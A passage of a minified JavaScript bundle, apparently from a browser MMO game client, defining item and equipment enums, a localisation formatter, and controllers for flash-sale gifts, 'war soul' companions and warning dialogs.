a;!function(t){t[t.Cancel=0]="Cancel",t[t.Confirm=1]="Confirm"}(a=e.BagCBConfirmResult||(e.BagCBConfirmResult={})),window.BagCBConfirmResult=a,window.BagCBConfirmResult=a;var r;!function(t){t[t.White=0]="White",t[t.Green=1]="Green",t[t.Blue=2]="Blue",t[t.Purple=3]="Purple",t[t.Orange=4]="Orange",t[t.Red=5]="Red"}(r=e.QualityType||(e.QualityType={})),window.QualityType=r,window.QualityType=r;var l;!function(t){t[t.None=0]="None",t[t.RecycleLessLevelEquip=7]="RecycleLessLevelEquip",t[t.NotRecycleXiLianEquip=8]="NotRecycleXiLianEquip"}(l=e.SettingBagType||(e.SettingBagType={})),window.SettingBagType=l,window.SettingBagType=l;var h;!function(t){t[t.Clear=1]="Clear",t[t.Soul=3]="Soul",t[t.DuanPo=4]="DuanPo"}(h=e.PANEL_TYPE||(e.PANEL_TYPE={})),window.PANEL_TYPE=h,window.PANEL_TYPE=h;var u;!function(t){t[t.Equip=0]="Equip",t[t.Item=1]="Item",t[t.All=2]="All"}(u=e.STORE_SUB_TYPE||(e.STORE_SUB_TYPE={})),window.STORE_SUB_TYPE=u,window.STORE_SUB_TYPE=u;var p;!function(t){t[t.UnLOCK=0]="UnLOCK",t[t.UnInlaid=1]="UnInlaid",t[t.Inlaid=2]="Inlaid"}(p=e.GEM_STATUS||(e.GEM_STATUS={})),window.GEM_STATUS=p,window.GEM_STATUS=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LangUtils=void 0;var n=i(0),o=i(10),s=function(){function t(){}return t.analysis=function(t,e){var i=n.GlobalConfig.LanguageConfig[t];return i?""==e?i.content:this.analysisParam(i,e):(console.error(t+"在语言包LanguageConfig中缺少配置"),t)},t.formatStr=function(t,e){var i=/\%s(\d+)\%/g;return!e||e.length<=0?t:(t.replace(i,t),t.replace(i,function(t,i,n,o){return e[i]}))},t.analysisParam=function(t,e){var i,n=[],o=t.config;if(o&&o.length>0){var s=JSON.parse(e);for(var a in o)if(""==o[a])n.push(s[a]);else{var r=null===(i=o[a])||void 0===i?void 0:i.split(".");if(s[a]instanceof Object){var l="";if(s[a]instanceof Array){for(var h in s[a])l+=""==l?this.getCfgStr1(s[a][h],r):","+this.getCfgStr1(s[a][h],r);n.push(l)}else{if(s[a].item)for(var u in s[a].item)l+=""==l?this.getCfgStr1(s[a].item[u],r):","+this.getCfgStr1(s[a].item[u],r);if(s[a].god){l+=""==l?gettext("战神特权掉落:"):gettext(",战神特权掉落:");var p=!0;for(var u in s[a].god)l+=p?this.getCfgStr1(s[a].god[u],r):","+this.getCfgStr1(s[a].god[u],r),p=!1}if(s[a].auto){l+=""==l?gettext("自动回收了:"):gettext(",自动回收了:");var p=!0;for(var u in s[a].auto)l+=p?this.getCfgStr1(s[a].auto[u],r):", "+this.getCfgStr1(s[a].auto[u],r)+" ",p=!1}n.push(l)}}else{var l=this.getCfgStr1(s[a],r);n.push(l)}}}return this.formatStr(t.content,n)},t.getCfgStr1=function(t,e){if(2==e.length){var i=[],s=/\_/g,a=s.test(t);i=a?t.split("_"):[t];var r=void 0,l="",h=0,u=e[1],p=u.match(/\[\]/g);if(p&&p.length>0){h=p.length;var d=u.indexOf("[");l=u.substring(0,d)}else l=u;var c="",f=0,g=e[0].match(/\[\]/g);if(g){f=g.length;var d=e[0].indexOf("["),m=e[0].substring(0,d);c=m,r=1==f?n.GlobalConfig[m][i[0]]:2==f?n.GlobalConfig[m][i[0]][i[1]]:3==f?n.GlobalConfig[m][i[0]][i[1]][i[2]]:4==f?n.GlobalConfig[m][i[0]][i[1]][i[2]][i[3]]:n.GlobalConfig[m][i[0]][i[1]][i[2]][i[3]][i[4]]}else f=0,c=e[0],r=n.GlobalConfig[c][l];var v="";if("ItemConfig"==c){var y=+i[0],C=+i[1],T=+i[2],b=+i[3],w="";0==y?n.GlobalConfig.MoneyConfig[C]?w=n.GlobalConfig.MoneyConfig[C].name:console.error("配置表MoneyConfig没有id为"+C+"的数据"):n.GlobalConfig[c][C]?w=n.GlobalConfig[c][C][l]:console.error("配置表"+e[0]+"中没有id为"+C+"的数据"),w="|C:"+o.ItemUtil.getQualityColor(b)+"&T:"+w+"|",v=w+"*"+T+" "}else{var I=void 0;I=0==f?r:r[l],v=0==h?I:1==h?I[i[i.length-1]]:2==h?I[i[i.length-2]][i[i.length-1]]:3==h?I[i[i.length-3]][i[i.length-2]][i[i.length-1]]:I,r.quality&&(v="|C:"+o.ItemUtil.getQualityColor(r.quality)+"&T:"+v+"|")}return v}return""},t.getCfgStr=function(t,e){var i=[],s=/\_/g,a=s.test(t);i=a?t.split("_"):[t];var r=0,l=0,h=0,u=0,p="";if("ItemConfig"==e[0]){r=+i[0],l=+i[1],h=+i[2],u=+i[3];var d="";0==r?n.GlobalConfig.MoneyConfig[l]?d=n.GlobalConfig.MoneyConfig[l].name:console.error("配置表MoneyConfig没有id为"+l+"的数据"):n.GlobalConfig[e[0]][l]?d=n.GlobalConfig[e[0]][l][e[1]]:console.error("配置表"+e[0]+"中没有id为"+l+"的数据"),d="|C:"+o.ItemUtil.getQualityColor(u)+"&T:"+d+"|",p=d+"*"+h+" "}else if(l=+i[0],n.GlobalConfig[e[0]][e[1]])if(n.GlobalConfig[e[0]][e[1]]instanceof Array){if(!n.GlobalConfig[e[0]][e[1]][l])return console.error("配置表"+e[0]+"中属性为"+[e[1]]+"中没有索引为"+l+"的数据"),p;p=n.GlobalConfig[e[0]][e[1]][l]}else p=n.GlobalConfig[e[0]][e[1]];else{if(!n.GlobalConfig[e[0]][l])return console.error("配置表"+e[0]+"中没有id为"+l+"的数据"),p;if(n.GlobalConfig[e[0]][l].quality){var c=n.GlobalConfig[e[0]][l].quality;p="|C:"+o.ItemUtil.getQualityColor(c)+"&T:"+n.GlobalConfig[e[0]][l][e[1]]+"|"}else p=n.GlobalConfig[e[0]][l][e[1]]}return p},t}();e.LangUtils=s,window.LangUtils=s,__reflect(s.prototype,"LangUtils",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameFlashGiftVo=e.GiftActionType=e.GameFlashSaleCt=void 0;var n=i(8),o=i(14),s=i(15),a=i(23),r=i(12),l=i(7),h=i(294),u=function(t){function e(){var e=t.call(this)||this;return e.giftArr=[],e.sysId=PackageID.LianJi,e.regNetMsg(23,e.curLimitGiftInfoBack),e.regNetMsg(24,e.subLimitGiftInfoBack),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initLogin=function(){Timer.has(this.timeHandler,this)||Timer.start(1e3,0,this.timeHandler,this)},e.prototype.timeHandler=function(){if(this.giftArr&&0!=this.giftArr.length){for(var t=!1,e=this.giftArr.length-1;e>=0;e--)this.giftArr[e].endTime<=l.GameServerCC.serverTime&&(this.giftArr.splice(e,1),t=!0);t&&(this.postGiftInfoChange(),t=!1)}},e.prototype.getMinEndTime=function(){if(!this.giftArr||0==this.giftArr.length)return 0;for(var t=0,e=0,i=this.giftArr.length;i>e;e++)0==e?t=this.giftArr[e].endTime:this.giftArr[e].endTime<t&&(t=this.giftArr[e].endTime);return t},e.prototype.curLimitGiftInfoBack=function(t){this.giftArr=[];for(var e=t.readByte(),i=0;e>i;i++){var n=new d;n.parse(t),this.giftArr.push(n)}this.postGiftInfoChange()},e.prototype.subLimitGiftInfoBack=function(t){var e=new d;e.parse(t),this.giftArr.unshift(e),this.giftArr&&this.giftArr.length>0&&!window.platform.isshen()&&win.open(h.GameFlashSaleWin,!0),this.postGiftInfoChange()},e.prototype.checkEnterOpen=function(){return r.OpenSystem.ins().checkSysOpen(s.SystemType.gameFlashGift)?this.giftArr&&this.giftArr.length>0:!1},e.prototype.reportLvNot=function(){this.countPlayerOperateInfo(p.type1)},e.prototype.reportGolaNot=function(){this.countPlayerOperateInfo(p.type2)},e.prototype.reportZsLvNot=function(){this.countPlayerOperateInfo(p.type3)},e.prototype.reportJMMaterialNot=function(){this.countPlayerOperateInfo(p.type4)},e.prototype.reportShenFuMaterialNot=function(){this.countPlayerOperateInfo(p.type5)},e.prototype.reportSkillMaterialNot=function(){this.countPlayerOperateInfo(p.type6)},e.prototype.reportShenBingMaterialNot=function(){this.countPlayerOperateInfo(p.type7)},e.prototype.reportXLSMaterialNot=function(){this.countPlayerOperateInfo(p.type8)},e.prototype.reportWingMaterialNot=function(){this.countPlayerOperateInfo(p.type9)},e.prototype.reportPowerNot=function(){this.countPlayerOperateInfo(p.type10)},e.prototype.countPlayerOperateInfo=function(t){a.GameLogic.ins().isEnterScene&&(this._playerOperationDic||(this._playerOperationDic={}),this._playerOperationDic[t]||(this._playerOperationDic[t]=0),this._playerOperationDic[t]++,this.reqReportAction(t,this._playerOperationDic[t]))},e.prototype.reqReportAction=function(t,e){var i=this.getBytes(23);i.writeByte(t),i.writeShort(1),this.sendToServer(i),urlParam.debugTS&&console.error("上报类型为"+t+",次数为"+e)},e.prototype.postGiftInfoChange=function(){},__decorate([post()],e.prototype,"postGiftInfoChange",null),e}(o.BaseSystem);e.GameFlashSaleCt=u,window.GameFlashSaleCt=u,__reflect(u.prototype,"GameFlashSaleCt",[]),Systemap.GameFlashSaleCt=function(){return u.ins()},window.GameFlashSaleCt=u;var p;!function(t){t[t.type1=1]="type1",t[t.type2=2]="type2",t[t.type3=3]="type3",t[t.type4=4]="type4",t[t.type5=5]="type5",t[t.type6=6]="type6",t[t.type7=7]="type7",t[t.type8=8]="type8",t[t.type9=9]="type9",t[t.type10=10]="type10",t[t.type11=11]="type11",t[t.type12=12]="type12"
}(p=e.GiftActionType||(e.GiftActionType={})),window.GiftActionType=p,window.GiftActionType=p;var d=function(){function t(){}return t.prototype.parse=function(t){this.giftId=t.readShort();var e=t.readInt();e>0&&(this.endTime=n.DateUtils.formatMiniDateTime(e))},t}();e.GameFlashGiftVo=d,window.GameFlashGiftVo=d,__reflect(d.prototype,"GameFlashGiftVo",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulInfo=e.WarSoulCT=void 0;var n=i(14),o=i(37),s=i(17),a=i(0),r=i(15),l=i(172),h=i(6),u=i(12),p=i(7),d=i(2),c=function(t){function e(){var e=t.call(this)||this;return e.warSoulDic={},e.warSoulList=[],e.curWarSoulId=0,e.curSelWarSoulId=0,e.curSelDecomIdLst=[],e.curSelBookId=0,e.curSelSkillBookId=0,e.lastFightTime=0,e.lastNameTime=0,e.lockSkillIdList=[],e.warSoulBookDic={},e.warSoulBookMaxLv=0,e.rp=new s.RedPoint,e.eggRp=new s.RedPoint,e.bookRp=new s.RedPoint,e.sysId=PackageID.LianJi,e.regNetMsg(40,e.postWarSoulInfo),e.regNetMsg(41,e.postWarSoulIdentity),e.regNetMsg(42,e.postWarSoulDecompose),e.regNetMsg(43,e.postWarSoulFight),e.regNetMsg(44,e.postWarSoulUpdate),e.regNetMsg(45,e.postWarSoulRestore),e.regNetMsg(46,e.postWarSoulLvUp),e.regNetMsg(47,e.postWarSoulTuJian),e.regNetMsg(48,e.postWarSoulTuJianLvUp),e.regNetMsg(49,e.postWarSoulEat),e.regNetMsg(50,e.postWarSoulName),e.regNetMsg(51,e.postWarSoulOutward),e.regNetMsg(52,e.postWarSoulLearnSkill),e.initRps(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRps=function(){var t=this;this.rp=new s.RedPoint(function(){return t.checkWarSoulEggRed()||t.checkWarSoulBookRed()},this.postWarSoulTuJian,this.postWarSoulTuJianLvUp,h.BagCT.ins().postItemAdd,h.BagCT.ins().postItemCountChange,h.BagCT.ins().postItemDel),this.eggRp=new s.RedPoint(function(){return t.checkWarSoulEggRed()},h.BagCT.ins().postItemAdd,h.BagCT.ins().postItemCountChange,h.BagCT.ins().postItemDel),this.bookRp=new s.RedPoint(function(){return t.checkWarSoulBookRed()},this.postWarSoulTuJian,this.postWarSoulTuJianLvUp)},e.prototype.postRedChange=function(){},e.prototype.checkWarSoulEggRed=function(){var t=u.OpenSystem.ins().checkSysOpen(r.SystemType.WarSoul);if(!t)return!1;for(var i=e.ins().getWarSoulEggIdList(),n=0,o=i;n<o.length;n++){var s=o[n],a=h.BagCT.ins().getBagItemCount(h.BagCT.BAG_TYPE_OTHTER,s);if(a)return!0}return!1},e.prototype.checkWarSoulBookRed=function(){var t=u.OpenSystem.ins().checkSysOpen(r.SystemType.WarSoul);if(!t)return!1;var e=this.warSoulBookDic;for(var i in e)if(this.checkWarSoulBookRedByBook(e[i]))return!0;return!1},e.prototype.checkWarSoulBookRedByBook=function(t){if(!t||!t.warsoulId)return!1;if(0==t.bookId)return!0;var i=a.GlobalConfig.WarSoulTuJianConfig[t.bookId];if(!i)return!1;var n=e.ins().getNextBookCfg(i);return i&&null==n?!1:t.num>=n.num?!0:!1},e.prototype.sendWarSoulInfo=function(){var t=this.getBytes(40);this.sendToServer(t)},e.prototype.postWarSoulInfo=function(t){for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readInt(),o=this.getWarSoul(n);o||(o=new f(n),this.warSoulDic[n]=o),o.parseBytes(t)}this.curWarSoulId=t.readInt(),this.postWarSoulInfoChange()},e.prototype.sendWarSoulIdentity=function(t,e){var i=this.getBytes(41);i.writeInt(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postWarSoulIdentity=function(t){var e=t.readInt(),i=this.getWarSoul(e);i||(i=new f(e),this.warSoulDic[e]=i),i.parseBytes(t);var n="0xe6b422";d.TipsCT.ins().showTips(gettext("鉴定成功，获得战灵{0}","|C:"+n+"&T:"+i.name+"|"))},e.prototype.sendWarSoulDecompose=function(t){var e=this.getBytes(42);e.writeInt(t),this.sendToServer(e)},e.prototype.postWarSoulDecompose=function(t){var i=t.readInt();this.delWarSoul(i);var n=e.ins().curSelDecomIdLst.indexOf(i);-1!=n&&e.ins().curSelDecomIdLst.splice(n,1)},e.prototype.sendWarSoulFight=function(t,e){var i=this.getBytes(43);i.writeInt(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postWarSoulFight=function(t){var e=t.readByte();if(1==e)return void d.TipsCT.ins().showTips(gettext("上阵失败"));if(2==e)return void d.TipsCT.ins().showTips(gettext("上阵CD中"));if(0==e){var i=t.readInt(),n=t.readByte();1==n&&i&&(this.curWarSoulId=i,d.TipsCT.ins().showTips(gettext("上阵战灵成功")))}},e.prototype.postWarSoulUpdate=function(t){var e=t.readInt(),i=this.getWarSoul(e);i||(i=new f(e),this.warSoulDic[e]=i),i.parseBytes(t),this.postWarSoulInfoChange()},e.prototype.sendWarSoulRestore=function(t){var e=this.getBytes(45);e.writeInt(t),this.sendToServer(e)},e.prototype.postWarSoulRestore=function(t){var e=t.readInt(),i=this.getWarSoul(e);i||(i=new f(e),this.warSoulDic[e]=i),i.parseBytes(t)},e.prototype.sendWarSoulLvUp=function(t,e){void 0===e&&(e=1);var i=this.getBytes(46);i.writeInt(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postWarSoulLvUp=function(t){var e=t.readInt(),i=this.getWarSoul(e);i||(i=new f(e),this.warSoulDic[e]=i),i.parseBytes(t)},e.prototype.sendWarSoulTuJian=function(){var t=this.getBytes(47);this.sendToServer(t)},e.prototype.postWarSoulTuJian=function(t){for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readShort(),o=t.readInt(),s=t.readInt();this.warSoulBookDic[n]={warsoulId:n,bookId:o,num:s}}this.warSoulBookMaxLv=t.readInt()},e.prototype.sendWarSoulTuJianLvUp=function(t){var e=this.getBytes(48);e.writeShort(t),this.sendToServer(e)},e.prototype.postWarSoulTuJianLvUp=function(t){var e=t.readShort(),i=t.readInt(),n=t.readInt();this.warSoulBookDic[e]={warsoulId:e,bookId:i,num:n},this.warSoulBookMaxLv=t.readInt()},e.prototype.sendWarSoulEat=function(t,e){var i=this.getBytes(49);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.postWarSoulEat=function(t){var i=t.readInt(),n=this.getWarSoul(i);n||(n=new f(i),this.warSoulDic[i]=n),n.parseBytes(t);var o=t.readInt();this.delWarSoul(o),e.ins().selSwaFuInfo=null},e.prototype.sendWarSoulName=function(t,e){var i=this.getBytes(50);i.writeInt(t),i.writeString(e),this.sendToServer(i)},e.prototype.postWarSoulName=function(t){var e=t.readInt(),i=t.readUnsignedByte();if(0==i){win.close("RenameWin");var n=t.readString();this.warSoulDic[e]&&(this.warSoulDic[e].name=n)}else l.RoleMgr.ins().showErrorTips(i);this.lastNameTime=p.GameServerCC.serverTime},e.prototype.postWarSoulOutward=function(t){var e=t.readDouble(),i=t.readInt(),n=t.readShort(),s=o.EntityManager.ins().getEntityByHandle(e);s&&s.data&&s.data.type==EntityType.Role&&(s.infoModel&&(s.infoModel.warsoulID=i),s.data.warsoulID=i,s.data.warsoulLV=n)},e.prototype.sendWarSoulLearnSkill=function(t,e,i){var n=this.getBytes(52);n.writeInt(t),n.writeInt(e),n.writeByte(i.length);for(var o=0;o<i.length;o++)n.writeInt(i[o]);this.sendToServer(n)},e.prototype.postWarSoulLearnSkill=function(t){var i=t.readInt(),n=this.getWarSoul(i);if(n){n.skillList=[];for(var o=t.readUnsignedByte(),s=0;o>s;s++)n.skillList.push(t.readInt());e.ins().curSelSkillBookId=0}},e.prototype.postWarSoulInfoChange=function(){},e.prototype.getWarSoul=function(t){return this.warSoulDic[t]},e.prototype.delWarSoul=function(t){delete this.warSoulDic[t],this.postWarSoulInfoChange()},e.prototype.getWarSoulEggIdList=function(){if(this.warSoulEggIdList&&this.warSoulEggIdList.length)return this.warSoulEggIdList;this.warSoulEggIdList=[];for(var t in a.GlobalConfig.WarSoulConfig){var e=a.GlobalConfig.WarSoulConfig[t];e.itemId&&this.warSoulEggIdList.push(e.itemId)}return this.warSoulEggIdList},e.prototype.getWarSoulInfoList=function(t){void 0===t&&(t=1);for(var i=[],n=0,o=Object.keys(e.ins().warSoulDic);n<o.length;n++){var s=o[n];i.push(e.ins().warSoulDic[s])}1==t?i=this.sortArr1(i):2==t?i=this.sortArr2(i):3==t&&(i=this.sortArr3(i));for(var a=-1,r=0;r<i.length;r++)if(i[r].id===this.curWarSoulId){a=r;break}if(-1!=a){var l=i.splice(a,1)[0];i.unshift(l)}return this.warSoulList=i,i},e.prototype.sortArr1=function(t){return t.sort(function(t,e){var i=0;for(var n in t.attr)i+=t.attr[n]?t.attr[n].total:0;var o=0;for(var n in e.attr)o+=e.attr[n]?e.attr[n].total:0;return o-i}),t},e.prototype.sortArr2=function(t){return t.sort(function(t,e){return e.score-t.score}),t},e.prototype.sortArr3=function(t){return t.sort(function(t,e){return t.id-e.id}),t},e.prototype.getValueQltyCfg=function(t,e){var i,n=99999;for(var o in a.GlobalConfig.WarSoulAttrScoreConfig){var s=a.GlobalConfig.WarSoulAttrScoreConfig[o],r=1==t?"":t.toString(),l=s["score"+r]||0;l>=e&&n>l&&(i=s,n=l)}return i},e.prototype.getAttrName=function(t,e){void 0===e&&(e=!1);var i="";switch(t){case 1:i=e?gettext("攻击资质"):gettext("攻击");break;case 2:i=e?gettext("防御资质"):gettext("防御");break;case 3:i=e?gettext("幸运资质"):gettext("幸运");break;case 4:i=e?gettext("契合资质"):gettext("契合")}return i},e.prototype.getNextBookCfg=function(t){if(!t)return null;for(var e in a.GlobalConfig.WarSoulTuJianConfig){var i=a.GlobalConfig.WarSoulTuJianConfig[e];if(i.warSoulId==t.warSoulId&&i.lv==t.lv+1)return i}return null},e.prototype.getWarSoulLvLimit=function(){var t=0,e=this.warSoulBookMaxLv;for(var i in a.GlobalConfig.WarSoulTuJianLvConfig){var n=a.GlobalConfig.WarSoulTuJianLvConfig[i];e>=n.tjLv&&t<n.zlLv&&(t=n.zlLv)}return t},e.prototype.getWarSoulNextLvLimit=function(){var t=0,e=9999,i=this.warSoulBookMaxLv;for(var n in a.GlobalConfig.WarSoulTuJianLvConfig){var o=a.GlobalConfig.WarSoulTuJianLvConfig[n];o.tjLv>i&&e>o.tjLv&&(e=o.tjLv,t=o.zlLv)}return[e,t]},e.prototype.getWarSoulCfgByEgg=function(t){for(var e in a.GlobalConfig.WarSoulConfig){var i=a.GlobalConfig.WarSoulConfig[e];if(i.itemId==t)return i}return null},e.prototype.checkChangeNameTime=function(t){void 0===t&&(t=!1);a.GlobalConfig.WarSoulBaseConfig.nameCd?a.GlobalConfig.WarSoulBaseConfig.nameCd:0;return p.GameServerCC.serverTime-this.lastNameTime>5?!0:(t&&d.TipsCT.ins().showTips(gettext("改名冷却中，请稍后再试")),!1)},e.prototype.getLockCost=function(t){for(var e in a.GlobalConfig.WarSoulSkillLockConfig){var i=a.GlobalConfig.WarSoulSkillLockConfig[e];if(i.lockNum==t)return i.cost}return[]},e.prototype.getCanLockSkillNum=function(t){var i=e.ins().getWarSoul(t),n=i?i.skillList.length:0,o=a.GlobalConfig.WarSoulBaseConfig.canLockNum[n];return o=o||0},e.prototype.setLockSkill=function(t,i){void 0===i&&(i=!0);var n=this.getCanLockSkillNum(e.ins().curSelWarSoulId);if(i&&n<=e.ins().lockSkillIdList.length)return void d.TipsCT.ins().showTips(gettext("可锁定技能数已达上限"));var o=e.ins().lockSkillIdList.indexOf(t);i?-1==o&&e.ins().lockSkillIdList.push(t):-1!=o&&e.ins().lockSkillIdList.splice(o,1)},e.prototype.getWarSoulModelImg=function(t){return RES_DIR_MONSTER+t+"_4h.png"},e.prototype.getWarSoulModelSet=function(t){return t&&t.modelSet?.01*t.modelSet:1},e.prototype.getWarSoulModelPos=function(t){if(!t||!t.modelOffset)return{x:0,y:0};var e=t.modelOffset[0]?t.modelOffset[0]:0,i=t.modelOffset[1]?t.modelOffset[1]:0;return{x:e,y:i}},__decorate([post()],e.prototype,"postRedChange",null),__decorate([post()],e.prototype,"postWarSoulInfo",null),__decorate([post()],e.prototype,"postWarSoulIdentity",null),__decorate([post()],e.prototype,"postWarSoulDecompose",null),__decorate([post()],e.prototype,"postWarSoulFight",null),__decorate([post()],e.prototype,"postWarSoulUpdate",null),__decorate([post()],e.prototype,"postWarSoulRestore",null),__decorate([post()],e.prototype,"postWarSoulLvUp",null),__decorate([post()],e.prototype,"postWarSoulTuJian",null),__decorate([post()],e.prototype,"postWarSoulTuJianLvUp",null),__decorate([post()],e.prototype,"postWarSoulEat",null),__decorate([post()],e.prototype,"postWarSoulName",null),__decorate([post()],e.prototype,"postWarSoulOutward",null),__decorate([post()],e.prototype,"postWarSoulLearnSkill",null),__decorate([post()],e.prototype,"postWarSoulInfoChange",null),e}(n.BaseSystem);e.WarSoulCT=c,window.WarSoulCT=c,__reflect(c.prototype,"WarSoulCT",[]);var f=function(){function t(t){this.attr={},this.id=t}return t.prototype.parseBytes=function(t){this.cfgId=t.readInt(),this.level=t.readShort(),this.score=t.readShort(),this.name=t.readString(),this.attr={};for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readUnsignedByte();this.attr[n]={id:n,value:t.readShort(),qlty:t.readInt(),total:t.readInt()}}this.proSkillList=[];for(var o=t.readUnsignedByte(),i=0;o>i;i++)this.proSkillList.push(t.readInt());this.skillList=[];for(var s=t.readUnsignedByte(),i=0;s>i;i++)this.skillList.push(t.readInt());this.cfg=a.GlobalConfig.WarSoulConfig[this.cfgId],this.name||(this.name=this.cfg?this.cfg.name:"")},t.prototype.getQualityCfg=function(){return a.GlobalConfig.WarSoulAttrConfig[this.score]?a.GlobalConfig.WarSoulAttrConfig[this.score]:null},t.prototype.getQualityImg=function(){var t=this.getQualityCfg(),e=t?t.quality:1;return"warsoul_qua"+e},t}();e.WarSoulInfo=f,window.WarSoulInfo=f,__reflect(f.prototype,"WarSoulInfo",[]),Systemap.WarSoulCT=function(){return c.ins()},window.WarSoulCT=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LocationProperty=void 0;var n=i(275),o=i(90),s=function(){function t(){}return t.init=function(){this.urlParam=urlParam,window.RES_RESOURCE+="/",window.RES_DIR+="/",window.MAP_DIR+="/"},Object.defineProperty(t,"resAdd",{get:function(){return this.urlParam.root||""},set:function(t){this.urlParam.hosts=t},enumerable:!1,configurable:!0}),Object.defineProperty(t,"openID",{get:function(){return this.urlParam.openId},set:function(t){this.urlParam.openId=t},enumerable:!1,configurable:!0}),Object.defineProperty(t,"srvid",{get:function(){return parseInt(this.urlParam.srvid)},set:function(t){this.urlParam.srvid=t},enumerable:!1,configurable:!0}),Object.defineProperty(t,"openKey",{get:function(){return this.urlParam.openkey},enumerable:!1,configurable:!0}),Object.defineProperty(t,"zoneId",{get:function(){return this.urlParam.zoneid},enumerable:!1,configurable:!0}),Object.defineProperty(t,"roleCount",{get:function(){return parseInt(this.urlParam.roleCount)},enumerable:!1,configurable:!0}),Object.defineProperty(t,"isnew",{get:function(){return parseInt(this.urlParam.isnew)},enumerable:!1,configurable:!0}),Object.defineProperty(t,"isFromQQBLUE",{get:function(){return urlParam.appid==n.PlatFormID.QQ_BLUE},enumerable:!1,configurable:!0}),Object.defineProperty(t,"pfid",{get:function(){return this.urlParam.pfid||""},enumerable:!1,configurable:!0}),Object.defineProperty(t,"pf",{get:function(){return this.urlParam.pf||""},enumerable:!1,configurable:!0}),Object.defineProperty(t,"isIosTS",{get:function(){return this.isTSServer&&o.DeviceUtils.IsIOS},enumerable:!1,configurable:!0}),Object.defineProperty(t,"isWanBaWX",{get:function(){return window.OPEN_DATA&&window.OPEN_DATA.qua&&"WX"==window.OPEN_DATA.qua.app},enumerable:!1,configurable:!0}),Object.defineProperty(t,"QQZoneChannel",{get:function(){return window&&window.OPEN_DATA?window.OPEN_DATA.channel:""},enumerable:!1,configurable:!0}),Object.defineProperty(t,"isLocation",{get:function(){return window.location&&location&&location.href?location.href.indexOf("192.168.201")>=0||location.href.indexOf("192.168.0")>=0||location.href.indexOf("127.0.0.1")>=0||location.href.indexOf("localhost")>=0||location.href.indexOf("cq.api.com")>=0||location.href.indexOf("10.10.1")>=0||location.href.indexOf("10.10.4")>=0:!1},enumerable:!1,configurable:!0}),Object.defineProperty(t,"isTSServer",{get:function(){return!0},enumerable:!1,configurable:!0}),Object.defineProperty(t,"isOPPO",{get:function(){return urlParam.appid==n.PlatFormID.OPPO||urlParam.appid==n.PlatFormID.OPPO_FENG||urlParam.appid==n.PlatFormID.OPPO_MI},enumerable:!1,configurable:!0}),Object.defineProperty(t,"isIOS",{get:function(){var t=platform.getOS().toLowerCase();return"ios"==t||"mac os"==t},enumerable:!1,configurable:!0}),t.IOS_NO_AD_TIME=9e5,t.urlParam={},t}();e.LocationProperty=s,window.LocationProperty=s,__reflect(s.prototype,"LocationProperty",[]),window.LocationProperty=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipPos=void 0;var n;!function(t){t[t.WEAPON=0]="WEAPON",t[t.HEAD=1]="HEAD",t[t.CLOTHES=2]="CLOTHES",t[t.NECKLACE=3]="NECKLACE",t[t.Wrist=4]="Wrist",t[t.BRACELET=5]="BRACELET",t[t.RING=6]="RING",t[t.SHOE=7]="SHOE",t[t.DZI=8]="DZI",t[t.HAT=9]="HAT",t[t.HAT2=10]="HAT2",t[t.VIZARD=11]="VIZARD",t[t.CLOAK=12]="CLOAK",t[t.SHIELD=13]="SHIELD",t[t.PowerRing=14]="PowerRing",t[t.MabiRing=15]="MabiRing",t[t.NoDamRing=16]="NoDamRing",t[t.ReviveRing=17]="ReviveRing",t[t.Medal=18]="Medal",t[t.JadePendant=19]="JadePendant",t[t.EquipType_Aegis=20]="EquipType_Aegis",t[t.EquipType_SecretRecord=21]="EquipType_SecretRecord",t[t.AnimalsRat=22]="AnimalsRat",t[t.AnimalsCow=23]="AnimalsCow",t[t.AnimalsTiger=24]="AnimalsTiger",t[t.AnimalsRabbit=25]="AnimalsRabbit",t[t.AnimalsDragon=26]="AnimalsDragon",t[t.AnimalsSnake=27]="AnimalsSnake",t[t.AnimalsHorse=28]="AnimalsHorse",t[t.AnimalsSheep=29]="AnimalsSheep",t[t.AnimalsMonkey=30]="AnimalsMonkey",t[t.AnimalsChicken=31]="AnimalsChicken",t[t.AnimalsDog=32]="AnimalsDog",t[t.AnimalsPig=33]="AnimalsPig",t[t.Spell=34]="Spell",t[t.Bugle=35]="Bugle",t[t.MAX=36]="MAX"}(n=e.EquipPos||(e.EquipPos={})),window.EquipPos=n,window.EquipPos=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarnCT=void 0;var n=i(14),o=i(2),s=i(0),a=i(19),r=i(36),l=i(30),h=i(9),u=i(12),p=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.setWarnLabel=function(t,e,i,n,o,s,a){void 0===n&&(n="normal"),void 0===o&&(o="left"),void 0===s&&(s=!1);var r=win.open("WarnWin",s);return r.setWarnLabel(t,e,i,n,o,a),r},e.prototype.setWarnLabel3=function(t,e,i,n,o,s,a,r){void 0===o&&(o="normal"),void 0===s&&(s="left"),void 0===a&&(a=!1);var l=win.open("WarnWin",a);return l.setWarnLabel3(t,e,i,n,o,s,r),l},e.prototype.setWarnLabel2=function(t,e,i,n,o,s,a,r,l){void 0===a&&(a="normal"),void 0===r&&(r="left"),void 0===l&&(l=!1);var h=win.open("WarnWin",l);return h.setWarnLabel2(t,e,i,n,o,s,a,r),h},e.prototype.setBuyGoodsWarn=function(t,e,i){void 0===e&&(e=1),void 0===i&&(i=!1);var n=s.GlobalConfig.GainItemConfig[t];if(!n&&i&&s.GlobalConfig.ItemConfig[t]){var a=s.GlobalConfig.ItemConfig[t].name;o.TipsCT.ins().showTips(a+gettext("不足"))}if(t==r.MoneyConst.gold&&!win.get("ExpGoldWin")&&!window.platform.isshen())return void 